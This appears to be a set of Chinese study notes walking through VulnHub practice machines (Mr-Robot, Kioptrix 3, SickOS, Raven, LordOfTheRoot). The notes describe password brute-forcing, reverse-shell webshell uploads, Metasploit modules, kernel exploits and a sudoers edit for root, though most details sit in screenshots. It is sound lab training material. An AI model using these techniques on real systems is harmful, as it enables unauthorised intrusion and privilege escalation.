![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image127.png){width="5.760416666666667in"
height="2.75459208223972in"}

#### **MR-ROBOT: 1（hydra爆破网站用户）**

信息搜集：使用nmap扫服务端口[发现又是常配的几个端口](https://twitter.com/home/?status=I%27m%20looking%20at%20Mr-Robot%3A%201%20(https%3A%2F%2Fwww.vulnhub.com%2Fentry%2Fmr-robot-1,151/%3Fsource%3Dtwitter)%20%23VulnHub)

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image128.png){width="5.760416666666667in"
height="3.8497834645669293in"}

使用nikto发现又wordpress框架

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image129.png){width="5.760416666666667in"
height="5.952431102362205in"}

使用弱密码登录不成功，再使用wpsacn扫用户

扫到robots.txt

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image130.png){width="5.125in"
height="0.78125in"}

访问发现有文章可以做

dic有可能是爆破的用户名或密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image131.png){width="5.760416666666667in"
height="1.6312685914260718in"}

果然下载后是密码也可能是用户名

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image132.png){width="2.9305555555555554in"
height="3.9421708223972005in"}

但是这个txt就可能是md5，使用john爆破

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image133.png){width="5.760416666666667in"
height="1.3485925196850395in"}

也有可能这个是密码

而那个dic是用户名的爆破

下载下来试试爆破

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image134.png){width="5.760416666666667in"
height="0.5821237970253719in"}

百度是说dic及时用户名也是密码

所以就要进行爆破用户名才可以更快做到爆破密码

使用hydra爆破用户名

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image135.png){width="5.760416666666667in"
height="1.2624015748031496in"}

然后爆破密码

爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image136.png){width="3.8194444444444446in"
height="0.6036176727909012in"}

上传木马反弹shell

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image137.png){width="5.760416666666667in"
height="2.9392465004374455in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image138.png){width="5.760416666666667in"
height="0.7961548556430447in"}

查看可用文件发现nmap提权文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image139.png){width="4.763888888888889in"
height="2.6894608486439195in"}

正好msfconsole有提权的模板

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image140.png){width="5.555555555555555in"
height="1.3237445319335084in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image141.png){width="4.361111111111111in"
height="2.190988626421697in"}

nmap提权失败

查看内核提权试试

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image142.png){width="5.760416666666667in"
height="1.6153958880139982in"}

提权失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image143.png){width="4.541666666666667in"
height="2.6354166666666665in"}

使用脏牛提权成功（但是电脑会嘎）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image144.png){width="4.736111111111111in"
height="4.903022747156605in"}

其实nmap可以提权不过我方式有问题

sudo nmap用不了

使用脚本的方式也不行

只能使用绝对路径了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image145.png){width="4.819444444444445in"
height="1.4364654418197724in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image146.png){width="5.75in"
height="1.1145833333333333in"}

#### **KIOPTRIX: LEVEL 1.2 （CMS框架渗透）**

信息收集：使用nmap扫全端口发现又是经典的20和80

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image147.png){width="5.180555555555555in"
height="2.1681200787401576in"}

扫服务漏洞也没发现什么

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image148.png){width="5.760416666666667in"
height="2.745683508311461in"}

对网站进行信息收集发现有phpmyadmin，说明可能有sql注入然后登录数据库什么的

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image149.png){width="5.166666666666667in"
height="1.6041666666666667in"}

看这个版本有点老试试看有没有版本漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image150.png){width="5.760416666666667in"
height="2.765in"}

版本漏洞也没发现什么

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image151.png){width="5.569444444444445in"
height="2.8994488188976377in"}

还是扫描子目录试试看有没有好东西

发现登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image152.png){width="5.760416666666667in"
height="2.832364391951006in"}

日志文件发现

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image153.png){width="5.760416666666667in"
height="3.4370669291338585in"}

发现目录浏览搜索敏感文件，密码用户什么的

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image154.png){width="5.760416666666667in"
height="3.791294838145232in"}

还是一无所获百度学习[此处搭建的像是一个CMS，使用whatweb进行探测，看此网站具体为什么CMS]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image155.png){width="5.760416666666667in"
height="1.9074223534558181in"}

[试试漏洞 uri 设置为 /]{.mark} set uri /

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image156.png){width="5.760416666666667in"
height="2.2030161854768155in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image157.png){width="4.569444444444445in"
height="0.9806572615923009in"}

[渗透不成功改一个payload
才行（比赛对于陌生的模块playload就要多改）]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image158.png){width="5.760416666666667in"
height="1.4260837707786527in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image159.png){width="5.760416666666667in"
height="1.308199912510936in"}

[查看/etc/passwd看看有没有bash用户如果有说明是要找密码之类的进行ssh登录提权]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image160.png){width="5.319444444444445in"
height="0.6870516185476815in"}

但是ssh登录都不行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image161.png){width="5.760416666666667in"
height="0.7387543744531934in"}

[内核查看]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image162.png){width="3.125in"
height="1.4583333333333333in"}

[使用wget下载提权文件]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image163.png){width="5.760416666666667in"
height="1.4975601487314085in"}

[40616.c内核提权失败]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image164.png){width="3.9027777777777777in"
height="1.790074365704287in"}

试试40389.c

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image165.png){width="5.760416666666667in"
height="2.271457786526684in"}

提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image166.png){width="5.222222222222222in"
height="1.396761811023622in"}

[只能看看是否有数据库的密码和用户登录之类的]{.mark}

[快速查看敏感目录]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image167.png){width="5.760416666666667in"
height="1.8495909886264217in"}

[发现mysql的登录密]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image168.png){width="5.138888888888889in"
height="1.0944892825896764in"}

[码]{.mark}

[找半天才发现可疑目录发现有密码爆破出来]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image169.png){width="5.760416666666667in"
height="3.3312478127734035in"}

[网站爆破]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image170.png){width="5.760416666666667in"
height="2.328205380577428in"}

[登录用户]{.mark}

[发现ht sudo提权]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image171.png){width="5.760416666666667in"
height="3.1273545494313213in"}

[ht提权用起来比较麻烦]{.mark}

[但是还是要学]{.mark}

测试第一个就登录成功，先看下权限，在看看有么有办法提权，如果不行，再尝试第二个账号。

尝试了ping命令suid提权，没有成功\...

测试第二个账号看看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image172.png){width="5.760416666666667in"
height="3.1930741469816275in"}

登录成功，发家目录下有两个文件，查看一下，根据文件提示，我们这个账号可能拥有sudo权限

loneferret@Kioptrix3:\~\$ head /etc/sudoers

head: cannot open \`/etc/sudoers\' for reading: Permission denied

尝试查看/etc/sudoers 文件，发现没有权限，根据文件提示，sudo ht

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image173.png){width="5.486111111111111in"
height="0.8865387139107611in"}

发现报错，提示

Error opening terminal: xterm-256color.

通过搜索并尝试找到了解决方法：

使用export TERM=xterm-color，解决成功

sudo ht之后打开了这个界面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image174.png){width="5.760416666666667in"
height="3.0258628608923885in"}

这是以root权限进入了一个文本编辑器，我们使用它按F3打开/etc/sudoers

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image175.png){width="5.760416666666667in"
height="3.4397397200349955in"}

给当前账号加上以root用户执行/bin/bash的权限。

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image176.png){width="5.760416666666667in"
height="1.9324671916010498in"}

按F2保存

然后使用sudo /bin/bash

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image177.png){width="4.069444444444445in"
height="0.957516404199475in"}

可以看到我们现在已经拿到了root权限

#### **SICKOS: 1.1(网络代理)**

信息收集；使用nmap扫发现开了三个端口

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image178.png){width="5.472222222222222in"
height="2.7204768153980754in"}

只有3128能访问

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image179.png){width="5.760416666666667in"
height="4.948965441819772in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image180.png){width="5.760416666666667in"
height="1.8663035870516185in"}

[分析可能是cms框架漏洞]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image181.png){width="5.760416666666667in"
height="0.9430129046369203in"}

[渗透失败]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image182.png){width="5.760416666666667in"
height="2.815984251968504in"}

[看百度说是]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image183.png){width="5.760416666666667in"
height="4.095974409448819in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image184.png){width="5.760416666666667in"
height="1.8549168853893263in"}

[要设置代理才能正常访问网页]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image185.png){width="5.760416666666667in"
height="2.3565343394575677in"}

[就连nikto也要代理扫]{.mark}

[描]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image186.png){width="5.760416666666667in"
height="3.7241404199475068in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image187.png){width="5.760416666666667in"
height="4.869448818897638in"}

[设置hosts应该才可以访问]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image188.png){width="5.760416666666667in"
height="2.9108956692913384in"}

[只能百度后台登录界面了]{.mark}

[扫不出]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image189.png){width="5.760416666666667in"
height="2.115845363079615in"}

[使用弱密码登录成功]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image190.png){width="5.760416666666667in"
height="3.446132983377078in"}

[发现上传点]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image191.png){width="5.760416666666667in"
height="1.844394138232721in"}

上传成功反弹

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image192.png){width="5.760416666666667in"
height="3.10459208223972in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image193.png){width="5.760416666666667in"
height="1.0262379702537183in"}

[后渗透提权]{.mark}

[发现有wget可以上传提权文件]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image194.png){width="3.5in"
height="1.03125in"}

[查看bash用户发现真有]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image195.png){width="4.444444444444445in"
height="0.6453291776027996in"}

[搜索config.php文件有几率就是那个数据库的用户密码]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image196.png){width="5.444444444444445in"
height="2.7898873578302714in"}

[不知道为什么使用root数据库密码登录成功了这个bash用户]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image197.png){width="5.760416666666667in"
height="3.5345844269466316in"}

[sudo su提权成功]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image198.png){width="3.75in"
height="0.9375in"}

#### **SICKOS: 1.2**

信息收集：使用nmap查看开放22，和80又是挑战我web的时候

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image199.png){width="5.760416666666667in"
height="2.2007228783902013in"}

扫服务感觉这个有问题可能有版本漏洞之类的

似乎并没有漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image200.png){width="5.760416666666667in"
height="1.8876793525809274in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image201.png){width="5.760416666666667in"
height="1.8763331146106736in"}

先nikto试试水并没有发现什么

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image202.png){width="5.760416666666667in"
height="2.5178947944007in"}

发现有给test目录可疑可能是什么协议可以任意上传之类的

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image203.png){width="5.361111111111111in"
height="4.808312554680665in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image204.png){width="5.760416666666667in"
height="2.744620516185477in"}

使用nmap扫test协议

nmap \--script http-methods \--script-args
http-methods.url-path=\'/test\' 111.111.111.129

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image205.png){width="5.760416666666667in"
height="2.208159448818898in"}

果然有PUT,使用burp抓包上传文件

一次成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image206.png){width="5.760416666666667in"
height="2.2665080927384076in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image207.png){width="5.760416666666667in"
height="2.671065179352581in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image208.png){width="5.760416666666667in"
height="1.996794619422572in"}

渗透提权

发现bash用户说明需要找到密码之类的登录提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image209.png){width="4.111111111111111in"
height="0.7181430446194226in"}

#### **RAVEN: 1（python的sudo提权）**

靶机有4个flag

信息收集：使用nmap扫描全端口发现有高端口40876

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image210.png){width="5.760416666666667in"
height="2.3952252843394577in"}

不是后门

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image211.png){width="2.7916666666666665in"
height="0.9375in"}

又发现wordpress

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image212.png){width="5.666666666666667in"
height="1.3854166666666667in"}

应该要改hosts果然可以看了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image213.png){width="4.875in"
height="1.6770833333333333in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image214.png){width="5.760416666666667in"
height="3.0711275153105864in"}

wpscan发现用户

wpscan \--url <http://raven.local/> -e u

发现两个用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image215.png){width="5.760416666666667in"
height="2.8293810148731406in"}

使用cewl生产密码爆破失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image216.png){width="5.760416666666667in"
height="1.80911854768154in"}

只能再试试kali自带的密码本了

使用老burp扫目录搜索flag

发现server.html

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image217.png){width="5.760416666666667in"
height="4.096591207349081in"}

得到flag1

爆破ssh，没想到这是爆破ssh不是爆破后台，要灵活运用才行啊，

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image218.png){width="5.760416666666667in"
height="2.4853116797900263in"}

爆破wordpress后台不超过就只能爆破ssh了

查看bash用户发现只有自己

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image219.png){width="5.430555555555555in"
height="0.8755599300087489in"}

说明就是现在用户提权

上传40616.c

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image220.png){width="5.760416666666667in"
height="0.34674321959755033in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image221.png){width="3.986111111111111in"
height="1.738069772528434in"}

脏牛提权失败试试其他的方法

百度说是要看清楚用户发现有一个sh用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image222.png){width="4.680555555555555in"
height="1.1675328083989502in"}

然后数据库好像还没登录过说不定有flag搜索config看看密码登录看看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image223.png){width="5.194444444444445in"
height="3.5777001312335956in"}

登录数据库成功寻找flag或者密码

查看wordpress目录看看是否有密码好登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image224.png){width="2.361111111111111in"
height="2.8416918197725285in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image225.png){width="5.760416666666667in"
height="1.1542541557305337in"}

爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image226.png){width="2.875in"
height="1.1770833333333333in"}

网站没什么东西哎，直接su切换用户

发现python文件sudo提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image227.png){width="5.760416666666667in"
height="0.82791447944007in"}

python 提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image228.png){width="5.760416666666667in"
height="0.41430336832895887in"}

#### **LordOfTheRoot_1.0.1 （端口碰撞,cc编译overlayfs提权）**

信息搜集：使用nmap扫只有一个22端口

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image229.png){width="5.760416666666667in"
height="1.7877154418197725in"}

连接提示容易的1，2，3

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image230.png){width="5.760416666666667in"
height="3.568688757655293in"}

没头绪百度说是端口碰撞，就像敲门如果敲门的频率不对就不让进，不开门（这个提示是敲1，2，3所以就使用hping3敲门）

端口碰撞是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。一旦收到正确的连接请求序列，防火墙规则就会被动态修改，以允许发送连接请求的主机通过特定端口进行连接。

端口碰撞的主要目的是防止攻击者通过进行端口扫描来扫描系统中潜在的可利用服务，因为除非攻击者发送正确的碰撞序列，否则受保护的端口将显示为关闭。

hping -S 111.111.111.134 -c 1 -p 1

hping -S 111.111.111.134 -c 1 -p 2

hping -S 111.111.111.134 -c 1 -p 3

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image231.png){width="5.760416666666667in"
height="3.2776476377952757in"}

门开了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image232.png){width="5.760416666666667in"
height="2.41454615048119in"}

是个网页

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image233.png){width="5.760416666666667in"
height="4.501195319335083in"}

发现有bash64

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image234.png){width="5.760416666666667in"
height="2.234701443569554in"}

解密

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image235.png){width="5.597222222222222in"
height="0.44819444444444445in"}

再解密

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image236.png){width="5.760416666666667in"
height="0.39351706036745404in"}

发现登录页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image237.png){width="5.760416666666667in"
height="2.6847189413823274in"}

扫后台发现并没有其他文件，估测是mysql数据库注入然后活动里面的用户密码然后进行提权

果然是sql注入

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image238.png){width="5.760416666666667in"
height="3.299430227471566in"}

sql爆破半天直接去看博主的密码然后开始爆破ssh成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image239.png){width="5.760416666666667in"
height="1.6622101924759405in"}

登录提权

并没有其他用户说明就是这个用户提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image240.png){width="5.263888888888889in"
height="0.6254122922134733in"}

使用脏牛提权好像不行

看看内核提权

使用这个37292.c

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image241.png){width="5.760416666666667in"
height="1.491068460192476in"}

内核提权失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image242.png){width="5.166666666666667in"
height="1.5104166666666667in"}

只能试试overlayfs漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image243.png){width="5.760416666666667in"
height="1.7019411636045494in"}

提权成功（用cc编译也是离谱）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image244.png){width="4.402777777777778in"
height="1.6549453193350832in"}

#### **RAVEN: 2(cve-2016-10033 UDF提权)**

信息收集：使用nmap分析发现开了个高端口肯定也没啥用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image245.png){width="5.760416666666667in"
height="2.5256463254593178in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image246.png){width="4.555555555555555in"
height="0.5837784339457568in"}

使用nikto分析80端口发现版本号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image247.png){width="5.760416666666667in"
height="3.6681080489938758in"}

又是wordpress

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image248.png){width="5.760416666666667in"
height="3.26423665791776in"}

又要设置hosts

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image249.png){width="2.9027777777777777in"
height="1.3317399387576554in"}

出了用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image250.png){width="5.760416666666667in"
height="1.8410323709536307in"}

吸取上次犯错经验现在就ssh和网站一起跑

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image251.png){width="5.760416666666667in"
height="2.374055118110236in"}

信息收集

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image252.png){width="5.760416666666667in"
height="5.508550962379703in"}

发现flag

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image253.png){width="5.760416666666667in"
height="1.4538199912510936in"}

发现版本号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image254.png){width="5.760416666666667in"
height="2.8232688101487313in"}

可疑漏洞名字好像正好符合5.2.16

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image255.png){width="5.760416666666667in"
height="0.4657655293088364in"}

使用msfconsole

设置targeturi为/contact.php不然不会成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image256.png){width="5.760416666666667in"
height="0.8669641294838145in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image257.png){width="5.305555555555555in"
